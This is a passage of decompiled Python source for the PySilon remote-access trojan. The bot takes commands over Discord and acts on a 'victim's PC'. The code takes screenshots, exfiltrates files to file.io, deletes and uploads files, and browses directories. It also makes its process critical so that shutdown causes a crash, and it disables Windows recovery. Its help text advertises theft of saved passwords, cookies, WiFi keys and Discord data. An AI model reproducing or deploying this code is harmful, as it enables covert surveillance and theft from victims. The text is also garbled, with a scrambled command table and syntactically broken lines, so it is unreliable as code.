Displays the current directory\'s structure = {'➡️ `.grab <what-to-grab>`': {'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'], 'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'], 'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'], 'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'], 'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'], 'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'], 'pwd': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'], '➡️ `.pwd`': ['clear', '➡️ `.clear`'], 'Displays current directory path': ['Clears all messages on the file-related channel', 'pwd'], 'ls': ['Lists current directory content', 'cd'], '➡️ `.cd <directory>`': ['Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)', 'tree'], '➡️ `.tree`': ['➡️ `.tree`', 'Displays the current directory\'s structure'], 'Displays the current directory\'s structure': ['Displays the current directory\'s structure', '➡️ `.download <file-or-directory-name>`'], 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download': ['Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download', '➡️ `.upload <type> <name>`'], 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC': ['

@client.event
async def on_message(message):
    global mouse_listener  # inserted
    global custom_message_to_send  # inserted
    global clipper_stop  # inserted
    global tree_messages  # inserted
    global process_to_kill  # inserted
    global cmd_messages  # inserted
    global input_blocked  # inserted
    global keyboard_listener  # inserted
    global vc  # inserted
    global expectation  # inserted
    global turned_off  # inserted
    global processes_list  # inserted
    global one_file_attachment_message  # inserted
    log('New message logged (source_assembled.py:658)')
    if message.author!= client.user:
        if message.content == f'<@{client.user.id}>':
            log('Author mentioned PySilon BOT (source_assembled.py:661)')
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
            log('Sent message with mention of Author (source_assembled.py:663)')
        log('Author is not a BOT (source_assembled.py:664)')
        if message.channel.id in channel_ids.values():
            log('Message channel is controlling this PC (source_assembled.py:666)')
            if message.content == '.implode':
                log('Message is \"implode\" (source_assembled.py:668)')
                await message.delete()
                log('Removed the message (source_assembled.py:670)')
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'
                log('Sent further instructions for implosion (source_assembled.py:673)')
            else:  # inserted
                if message.content == '.restart':
                    log('Message is \"restart\" (source_assembled.py:676)')
                    await message.delete()
                    log('Removed the message (source_assembled.py:678)')
                    await message.channel.send('```PySilon will be restarted now... Stand by...```')
                    log('Sent message about restart (source_assembled.py:680)')
                    os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                    log('Executed PySilon. Killing itself (source_assembled.py:682)')
                    sys.exit(0)
                else:  # inserted
                    if message.content[:5] == '.help':
                        await message.delete()
                        if message.content.strip() == '.help':
                            log('Author wants general help (source_assembled.py:690)')
                            embed = discord.Embed(title='List of all available commands', color=4848643)
                            for i in help['commands'].keys():
                                embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                            await message.channel.send(embed=embed)
                            embed = discord.Embed(color=4848643)
                            for i in help['commands2'].keys():
                                embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                            await message.channel.send(embed=embed)
                            log('Sent message with PySilon commands manual (source_assembled.py:699)')
                    else:  # inserted
                        if message.content == '.set-critical':
                            log('Message is set-critical (source_assembled.py:702)')
                            await message.delete()
                            log('Removed the message (source_assembled.py:704)')
                            try:
                                ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                                ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                                log('Set PySilon as a critical process (source_assembled.py:708)')
                                embed = discord.Embed(title='🟣 System', description='```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                reaction_msg = await message.channel.send(embed=embed)
                                await reaction_msg.add_reaction('🔴')
                                log('Sent success message (source_assembled.py:712)')
                            except:
                                await message.channel.send('`Something went wrong while elevating the process`')
                                log('Something went wrong when setting critical process (source_assembled.py:715)')
                        else:  # inserted
                            if message.content == '.unset-critical':
                                log('Message is unset-critical (source_assembled.py:718)')
                                await message.delete()
                                log('Removed the message (source_assembled.py:720)')
                                try:
                                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                                    log('Removed PySilon from critical processes (source_assembled.py:723)')
                                    embed = discord.Embed(title='🟣 System', description='```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                    reaction_msg = await message.channel.send(embed=embed)
                                    await reaction_msg.add_reaction('🔴')
                                    log('Sent success message (source_assembled.py:727)')
                                except:
                                    await message.channel.send('`Something went wrong while removing critical status`')
                                    log('Something went wrong when unsetting critical process (source_assembled.py:730)')
                            else:  # inserted
                                if message.content == '.disable-reset':
                                    log('Message is disable-reset (source_assembled.py:733)')
                                    await message.delete()
                                    log('Removed the message (source_assembled.py:735)')
                                    if IsAdmin():
                                        subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                                        log('Disabled ReAgentC (source_assembled.py:738)')
                                        embed = discord.Embed(title='🟣 System', description='```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                        reaction_msg = await message.channel.send(embed=embed)
                                        await reaction_msg.add_reaction('🔴')
                                        log('Sent success message (source_assembled.py:742)')
                                        return
                                    else:  # inserted
                                        embed = discord.Embed(title='📛 Error', description='```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                        reaction_msg = await message.channel.send(embed=embed)
                                        await reaction_msg.add_reaction('🔴')
                                        log('Sent error message for missing permissions (source_assembled.py:747)')
                                        return
                                else:  # inserted
                                    if message.content == '.enable-reset':
                                        log('Message is disable-reset (source_assembled.py:750)')
                                        await message.delete()
                                        log('Removed the message (source_assembled.py:752)')
                                        if IsAdmin():
                                            subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                                            log('Disabled ReAgentC (source_assembled.py:755)')
                                            embed = discord.Embed(title='🟣 System', description='```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                            reaction_msg = await message.channel.send(embed=embed)
                                            await reaction_msg.add_reaction('🔴')
                                            log('Sent success message (source_assembled.py:759)')
                                            return
                                        else:  # inserted
                                            embed = discord.Embed(title='📛 Error', description='```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                            reaction_msg = await message.channel.send(embed=embed)
                                            await reaction_msg.add_reaction('🔴')
                                            log('Sent error message for missing permissions (source_assembled.py:764)')
                                    else:  # inserted
                                        if expectation == 'key':
                                            log('Message is PySilon.key candidate (source_assembled.py:767)')
                                            try:
                                                split_v1 = str(message.attachments).split('filename=\'')[1]
                                                log('Message has a file attached (source_assembled.py:770)')
                                                filename = str(split_v1).split('\' ')[0]
                                                filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                                                log('Fetched file name (source_assembled.py:773)')
                                                await message.attachments[0].save(fp=filename)
                                                log('Downloaded the attached file (source_assembled.py:775)')
                                                if get_file_hash(filename) == secret_key:
                                                    log('File\'s checksum is same as secret key (source_assembled.py:777)')
                                                    reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with \"💀\".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with \"🔴\".```')
                                                    log('Sent message that Author is authorized to implode PySilon (source_assembled.py:779)')
                                                    await reaction_msg.add_reaction('💀')
                                                    log('Added \"implode\" reaction (source_assembled.py:781)')
                                                    await reaction_msg.add_reaction('🔴')
                                                    log('Added \"cancel implosion\" reaction (source_assembled.py:783)')
                                                    expectation = 'implosion'
                                                else:  # inserted
                                                    log('Message does not contain valid PySilon.key for this copy (source_assembled.py:786)')
                                                    reaction_msg = await message.channel.send('```❗ Provided key is invalid```')
                                                    await reaction_msg.add_reaction('🔴')
                                                    log('Sent message about denial of access (source_assembled.py:788)')
                                                    expectation = None
                                            except Exception as err:
                                                log('An error occurred while fetching the PySilon.key candidate (source_assembled.py:791)')
                                                await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                                                log('Sent information about the error (source_assembled.py:793)')
                                                expectation = None
                                                return None
                                        if message.content == '.ss':
                                            log('Message is \"take screenshot\"(screenshot.py:7->source_assembled.py:797)')
                                            await message.delete()
                                            log('Removed the message(screenshot.py:9->source_assembled.py:799)')
                                            ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                                            log('Saved a screenshot of this PCs screen(screenshot.py:11->source_assembled.py:801)')
                                            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(), color=' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                                            log('Sent embed containing screenshot(screenshot.py:13->source_assembled.py:803)')
                                            await reaction_msg.add_reaction('📌')
                                            log('Reacted with \"pin\"(screenshot.py:15->source_assembled.py:805)')
                                            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
                                            log('Removed the screenshot(screenshot.py:18->source_assembled.py:807)')
                                            return
                                        else:  # inserted
                                            if message.content[:9] == '.download':
                                                log('Message is \"download\" (file_downloading.py:7->source_assembled.py:809)')
                                                await message.delete()
                                                log('Removed the message (file_downloading.py:9->source_assembled.py:811)')
                                                if message.channel.id == channel_ids['file']:
                                                    log('Message channel is the file-related channel (file_downloading.py:11->source_assembled.py:813)')
                                                    if message.content == '.download':
                                                        log('Author issued empty \".download\" command (file_downloading.py:13->source_assembled.py:815)')
                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                        reaction_msg = await message.channel.send(embed=embed)
                                                        await reaction_msg.add_reaction('🔴')
                                                        log('Sent embed about usage of \".download\" (file_downloading.py:17->source_assembled.py:819)')
                                                        return
                                                    else:  # inserted
                                                        if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                                                            log('File requested by Author does exist on this PC (file_downloading.py:20->source_assembled.py:822)')
                                                            target_file = '/'.join(working_directory) + '/' + message.content[10:]
                                                            log('Determined actual path to requested file (file_downloading.py:22->source_assembled.py:824)')
                                                            if os.path.isdir(target_file):
                                                                log('The file turned out to be a directory (file_downloading.py:24->source_assembled.py:826)')
                                                                target_file = target_file + '.zip'
                                                                with ZipFile(target_file, 'w') as zip:
                                                                    for file in get_all_file_paths('.'.join(target_file.split('.')[:(-1)])):
                                                                        try:
                                                                            zip.write(file)
                                                                            log('Compressed the directory into .zip (file_downloading.py:30->source_assembled.py:832)')
                                                                        except Exception as e:
                                                                            log('Error occurred while compressing the directory into .zip (file_downloading.py:32->source_assembled.py:834)')
                                                                            message.channel.send(e)
                                                                            log('Sent message with information about this error. Aborting operation (file_downloading.py:34->source_assembled.py:836)')
                                                            await message.channel.send('```Uploading to file.io... This can take a while depending on the file size, amount and the victim\'s internet speed..```')
                                                            log('Sent message about File.io upload (file_downloading.py:37->source_assembled.py:839)')
                                                            data = {'file': open(target_file, 'rb')}
                                                            url = 'https://file.io/'
                                                            log('Set up required things for File.io upload (file_downloading.py:42->source_assembled.py:844)')
                                                            response = requests.post(url, files=data)
                                                            log('Uploaded the file onto File.io(file_downloading.py:44->source_assembled.py:846)')
                                                            data = response.json()
                                                            log('Received response from File.io (file_downloading.py:46->source_assembled.py:848)')
                                                            embed = discord.Embed(title=f"🟢 {message.content[10:]}", description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                            await message.channel.send(embed=embed)
                                                            log('Sent Anonfiles link to uploaded file(file_downloading.py:50->source_assembled.py:852)')
                                                            await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
                                                        else:  # inserted
                                                            log('File requested by Author does not exist on this PC (file_downloading.py:53->source_assembled.py:855)')
                                                            embed = discord.Embed(title='📛 Error', description='```❗ File or directory not found.```', colour=discord.Colour.red())
                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                            reaction_msg = await message.channel.send(embed=embed)
                                                            await reaction_msg.add_reaction('🔴')
                                                            log('Sent embed about missing file (file_downloading.py:57->source_assembled.py:859)')
                                                else:  # inserted
                                                    log('Message is not sent on file-related channel (file_downloading.py:59->source_assembled.py:861)')
                                                    embed = discord.Embed(title='📛 Error', description=f"_ _\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" + '>❗\n||-||', colour=discord.Colour.red())
                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                    reaction_msg = await message.channel.send(embed=embed)
                                                    await reaction_msg.add_reaction('🔴')
                                                    log('Sent embed about wrong channel (file_downloading.py:63->source_assembled.py:865)')
                                            else:  # inserted
                                                if message.content == '.done':
                                                    log('Message is \"done\" (file_uploading.py:54->source_assembled.py:867)')
                                                    await message.delete()
                                                    log('Removed the message (file_uploading.py:56->source_assembled.py:869)')
                                                    if expectation == 'multiplefiles':
                                                        log('Multiple files were logged (file_uploading.py:58->source_assembled.py:871)')
                                                        files_to_merge[0].append(await message.channel.send(f"```This files will be uploaded and merged into  " + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
                                                        log('Sent message about ongoing file downloading and merging (file_uploading.py:60->source_assembled.py:873)')
                                                        await files_to_merge[0][(-1)].add_reaction('📤')
                                                        log('Reacted with \"confirm upload\" (file_uploading.py:62->source_assembled.py:875)')
                                                        await files_to_merge[0][(-1)].add_reaction('🔴')
                                                        log('Reacted with \"cancel uploading\" (file_uploading.py:64->source_assembled.py:877)')
                                                else:  # inserted
                                                    if message.content[:7] == '.upload':
                                                        log('Message is \"upload\" (file_uploading.py:66->source_assembled.py:879)')
                                                        await message.delete()
                                                        log('Removed the message (file_uploading.py:68->source_assembled.py:881)')
                                                        if message.channel.id == channel_ids['file']:
                                                            log('Message channel is file-related (file_uploading.py:70->source_assembled.py:883)')
                                                            if message.content.strip() == '.upload':
                                                                log('Author issued empty .upload (file_uploading.py:72->source_assembled.py:885)')
                                                                reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 25MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 25MB```')
                                                                await reaction_msg.add_reaction('🔴')
                                                                log('Sent message about usage of .upload (file_uploading.py:74->source_assembled.py:887)')
                                                            else:  # inserted
                                                                if message.content[8:] == 'single':
                                                                    log('Author requested to upload single file (file_uploading.py:77->source_assembled.py:890)')
                                                                    expectation = 'onefile'
                                                                    await message.channel.send('```Please send here a file to upload.```')
                                                                    log('Sent message letting to send files (file_uploading.py:80->source_assembled.py:893)')
                                                                    return
                                                                else:  # inserted
                                                                    if message.content[8:16] == 'multiple' and len(message.content) > 17:
                                                                        log('Author requested to upload multiple files (divided bigger one) (file_uploading.py:82->source_assembled.py:895)')
                                                                        expectation = 'multiplefiles'
                                                                        files_to_merge[2] = message.content[17:]
                                                                        files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
                                                                        log('Sent message about files logging (file_uploading.py:86->source_assembled.py:899)')
                                                                    else:  # inserted
                                                                        log('The syntax of command is wrong (file_uploading.py:88->source_assembled.py:901)')
                                                                        reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```')
                                                                        await reaction_msg.add_reaction('🔴')
                                                                        log('Sent message about usage of .upload (file_uploading.py:90->source_assembled.py:903)')
                                                        else:  # inserted
                                                            log('Message channel is not file-related (file_uploading.py:92->source_assembled.py:905)')
                                                            reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                            await reaction_msg.add_reaction('🔴')
                                                            log('Sent message about wrong channel (file_uploading.py:94->source_assembled.py:907)')
                                                    else:  # inserted
                                                        if message.content[:7] == '.remove':
                                                            log('Message is \"remove\" (file_removal.py:7->source_assembled.py:909)')
                                                            await message.delete()
                                                            log('Removed the message (file_removal.py:9->source_assembled.py:911)')
                                                            if message.channel.id == channel_ids['file']:
                                                                log('Message channel is file-related (file_removal.py:11->source_assembled.py:913)')
                                                                if message.content.strip() == '.remove':
                                                                    log('Author issued empty .remove (file_removal.py:13->source_assembled.py:915)')
                                                                    embed = discord.Embed(title='📛 Error', description='```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                    await reaction_msg.add_reaction('🔴')
                                                                    log('Sent embed with usage of .remove (file_removal.py:17->source_assembled.py:919)')
                                                                    return
                                                                else:  # inserted
                                                                    if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                                                                        log('File/Directory requested by Author does exist on this PC (file_removal.py:20->source_assembled.py:922)')
                                                                        try:
                                                                            if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                                                                subprocess.run(['del \"' + '\\'.join(working_directory)] + ['\\'] * message.content[8:], '\"', shell=True)
                                                                                log('Removed a file (file_removal.py:24->source_assembled.py:926)')
                                                                            else:  # inserted
                                                                                rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                                                                log('Removed a directory (file_removal.py:27->source_assembled.py:929)')
                                                                            embed = discord.Embed(title='🟢 Success', description=f"```Successfully removed  {'/'.join(working_directory)}" + '/' + message.content[8:], colour=discord.Colour.green())
                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                            await reaction_msg.add_reaction('🔴')
                                                                            log('Sent embed about removal (file_removal.py:31->source_assembled.py:933)')
                                                                        except Exception as error:
                                                                            log('Error occurred while trying to remove a file/directory (file_removal.py:33->source_assembled.py:935)')
                                                                            embed = discord.Embed('📛 Error', title=f'`' + str(error), description=f'`', colour=discord.Colour.red())
                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                            await reaction_msg.add_reaction('🔴')
                                                                            log('Sent embed with information about this error (file_removal.py:37->source_assembled.py:939)')
                                                                            return None
                                                                    log('File/Directory requested by Author does not exist on this PC (file_removal.py:39->source_assembled.py:941)')
                                                                    embed = discord.Embed(title='📛 Error', description='```❗ File or directory not found.```', colour=discord.Colour.red())
                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                    await reaction_msg.add_reaction('🔴')
                                                                    log('Sent embed about missing file/directory (file_removal.py:43->source_assembled.py:945)')
                                                            else:  # inserted
                                                                log('Message channel is not file-related (file_removal.py:45->source_assembled.py:947)')
                                                                embed = discord.Embed(title='📛 Error', description=f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" + '>❗\n||-||', colour=discord.Colour.red())
                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                await reaction_msg.add_reaction('🔴')
                                                                log('Sent embed about wrong channel (file_removal.py:49->source_assembled.py:951)')
                                                        else:  # inserted
                                                            if message.content == '.clear':
                                                                log('Message is \"clear\" (file_explorer.py:27->source_assembled.py:953)')
                                                                await message.delete()
                                                                log('Removed the message (file_explorer.py:29->source_assembled.py:955)')
                                                                if message.channel.id == channel_ids['file']:
                                                                    log('Message channel is file-related (file_explorer.py:31->source_assembled.py:957)')
                                                                    async for message in client.get_channel(channel_ids['file']).history():
                                                                        await message.delete()
                                                                        log('Removed a message (file_explorer.py:34->source_assembled.py:960)')
                                                                else:  # inserted
                                                                    log('Message channel is not file-related (file_explorer.py:36->source_assembled.py:962)')
                                                                    reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                    await reaction_msg.add_reaction('🔴')
                                                                    log('Sent message about wrong channel (file_explorer.py:38->source_assembled.py:964)')
                                                            else:  # inserted
                                                                if message.content == '.tree':
                                                                    log('Message is \"tree\" (file_explorer.py:40->source_assembled.py:966)')
                                                                    await message.delete()
                                                                    log('Removed the message (file_explorer.py:42->source_assembled.py:968)')
                                                                    if message.channel.id == channel_ids['file']:
                                                                        log('Message channel is file-related (file_explorer.py:44->source_assembled.py:970)')
                                                                        tree_messages = []
                                                                        tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
                                                                        dir_path = Path('/'.join(working_directory))
                                                                        tree_messages.append(await message.channel.send(f"```Directory tree requested by {str(message.author)}" + '\n\n' + '/'.join(working_directory) + '```'))
                                                                        log('Sent first message of tree (file_explorer.py:49->source_assembled.py:975)')
                                                                        with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
                                                                            system_tree.write(str(dir_path) + '\n')
                                                                            log('Created tree.txt (file_explorer.py:52->source_assembled.py:978)')
                                                                        length_limit = sys.maxsize
                                                                        iterator = tree(Path('/'.join(working_directory)))
                                                                        log('Got tree (file_explorer.py:55->source_assembled.py:981)')
                                                                        tree_message_content = '```^\n'
                                                                        for line in islice(iterator, length_limit):
                                                                            with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                                                                                system_tree.write(line + '\n')
                                                                                log('Written tree into tree.txt (file_explorer.py:60->source_assembled.py:986)')
                                                                            if len(tree_message_content) > 1800:
                                                                                tree_messages.append(await message.channel.send(tree_message_content * str(line) + '```'))
                                                                                log('Sent tree (file_explorer.py:63->source_assembled.py:989)')
                                                                                tree_message_content = '```'
                                                                            else:  # inserted
                                                                                tree_message_content = tree_message_content | str(line) | '\n'
                                                                                log('Sent tree (file_explorer.py:67->source_assembled.py:993)')
                                                                        if tree_message_content!= '```':
                                                                            tree_messages.append(await message.channel.send(tree_message_content + '```'))
                                                                            log('Sent tree (file_explorer.py:70->source_assembled.py:996)')
                                                                        reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                                                                        log('Sent message about end of tree (file_explorer.py:72->source_assembled.py:998)')
                                                                        await reaction_msg.add_reaction('📥')
                                                                        log('Reacted with \"download tree\" (file_explorer.py:74->source_assembled.py:1000)')
                                                                        await reaction_msg.add_reaction('🔴')
                                                                        log('Reacted with \"remove tree messages\" (file_explorer.py:76->source_assembled.py:1002)')
                                                                        return
                                                                    else:  # inserted
                                                                        log('Message channel is not file-related (file_explorer.py:78->source_assembled.py:1004)')
                                                                        reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                        await reaction_msg.add_reaction('🔴')
                                                                        log('Sent message about wrong channel (file_explorer.py:80->source_assembled.py:1006)')
                                                                else:  # inserted
                                                                    if message.content[:3] == '.cd':
                                                                        log('Message is \"cd\" (file_explorer.py:82->source_assembled.py:1008)')
                                                                        await message.delete()
                                                                        log('Removed the message (file_explorer.py:84->source_assembled.py:1010)')
                                                                        if message.channel.id == channel_ids['file']:
                                                                            log('Message channel is file-related (file_explorer.py:86->source_assembled.py:1012)')
                                                                            if message.content.strip() == '.cd':
                                                                                log('Author issued empty .cd (file_explorer.py:88->source_assembled.py:1014)')
                                                                                reaction_msg = await message.channel.send('```Syntax: .cd <directory>```')
                                                                                await reaction_msg.add_reaction('🔴')
                                                                                log('Sent message with usage of .cd (file_explorer.py:90->source_assembled.py:1016)')
                                                                                return
                                                                            else:  # inserted
                                                                                if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                                                                                    log('Requested directory exists on this PC (file_explorer.py:93->source_assembled.py:1019)')
                                                                                    if '/' in message.content:
                                                                                        log('Author requested to change directory by more than 1 level (file_explorer.py:95->source_assembled.py:1021)')
                                                                                        for dir in message.content[4:].split('/'):
                                                                                            if dir == '..':
                                                                                                working_directory.pop((-1))
                                                                                                log('Moved one directory backwards (file_explorer.py:99->source_assembled.py:1025)')
                                                                                            else:  # inserted
                                                                                                working_directory.append(dir)
                                                                                                log('Moved one directory forward (file_explorer.py:102->source_assembled.py:1028)')
                                                                                    else:  # inserted
                                                                                        if message.content[4:] == '..':
                                                                                            working_directory.pop((-1))
                                                                                            log('Moved one directory backwards (file_explorer.py:106->source_assembled.py:1032)')
                                                                                        else:  # inserted
                                                                                            working_directory.append(message.content[4:])
                                                                                            log('Moved one directory forward (file_explorer.py:109->source_assembled.py:1035)')
                                                                                    reaction_msg = await message.channel.send(f"```You are now in: " + '/'.join(working_directory) + '```')
                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                    log('Sent message about new working directory (file_explorer.py:111->source_assembled.py:1037)')
                                                                                    return
                                                                                else:  # inserted
                                                                                    if os.path.isdir(message.content[4:]):
                                                                                        log('Author requested to change working directory to certain path (file_explorer.py:114->source_assembled.py:1040)')
                                                                                        working_directory.clear()
                                                                                        log('Cleared working directory variable (file_explorer.py:116->source_assembled.py:1042)')
                                                                                        for dir in message.content[4:].split('/'):
                                                                                            working_directory.append(dir)
                                                                                            log('Moved one directory forward (file_explorer.py:119->source_assembled.py:1045)')
                                                                                        reaction_msg = await message.channel.send(f"```You are now in: " + '/'.join(working_directory) + '```')
                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                        log('Sent message about new working directory (file_explorer.py:121->source_assembled.py:1047)')
                                                                                    else:  # inserted
                                                                                        log('Requested directory does not exist on this PC (file_explorer.py:123->source_assembled.py:1049)')
                                                                                        reaction_msg = await message.channel.send('```❗ Directory not found.```')
                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                        log('Sent message about missing directory (file_explorer.py:125->source_assembled.py:1051)')
                                                                                        return
                                                                        else:  # inserted
                                                                            log('Message channel is not file-related (file_explorer.py:127->source_assembled.py:1053)')
                                                                            reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                            await reaction_msg.add_reaction('🔴')
                                                                            log('Sent message about wrong channel (file_explorer.py:129->source_assembled.py:1055)')
                                                                    else:  # inserted
                                                                        if message.content == '.ls':
                                                                            log('Message is \"ls\" (file_explorer.py:131->source_assembled.py:1057)')
                                                                            await message.delete()
                                                                            log('Removed the message (file_explorer.py:133->source_assembled.py:1059)')
                                                                            if message.channel.id == channel_ids['file']:
                                                                                log('Message channel is file-related (file_explorer.py:135->source_assembled.py:1061)')
                                                                                dir_content_f, dir_content_d, directory_content = ([], [], [])
                                                                                for element in os.listdir('/'.join(working_directory) + '/'):
                                                                                    if os.path.isfile('/'.join(working_directory) + '/' + element):
                                                                                        dir_content_f.append(element)
                                                                                    else:  # inserted
                                                                                        dir_content_d.append(element)
                                                                                log('Fetched the content of working directory (file_explorer.py:140->source_assembled.py:1066)')
                                                                                dir_content_d.sort(key=str.casefold)
                                                                                dir_content_f.sort(key=str.casefold)
                                                                                log('Sorted the listed content of working directory (file_explorer.py:142->source_assembled.py:1068)')
                                                                                for single_directory in dir_content_d:
                                                                                    directory_content.append(single_directory)
                                                                                for single_file in dir_content_f:
                                                                                    directory_content.append(single_file)
                                                                                log('Built final list of working directory content (file_explorer.py:145->source_assembled.py:1071)')
                                                                                await message.channel.send(f"```Content of {'/'.join(working_directory)}" + '/ at ' + current_time() + '```')
                                                                                log('Sent header message of working directory list (file_explorer.py:147->source_assembled.py:1073)')
                                                                                lsoutput = directory_content
                                                                                while lsoutput!= []:
                                                                                    if len('\n'.join(lsoutput)) > 1994:
